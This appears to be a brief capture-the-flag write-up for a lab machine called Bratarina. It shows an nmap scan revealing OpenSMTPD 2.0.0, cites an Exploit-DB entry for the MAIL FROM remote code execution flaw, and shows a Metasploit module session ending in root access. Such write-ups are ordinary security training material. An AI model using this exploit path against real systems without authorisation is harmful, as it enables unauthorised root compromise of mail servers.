# Bratarina

### Enumeration

```
25/tcp  open   smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.49.234], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 
```

OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)

[https://www.exploit-db.com/exploits/48038](https://www.exploit-db.com/exploits/48038)

### Access

```
msf6 exploit(unix/smtp/opensmtpd_mail_from_rce) >
...

id
uid=0(root) gid=0(root) groups=0(root)
```
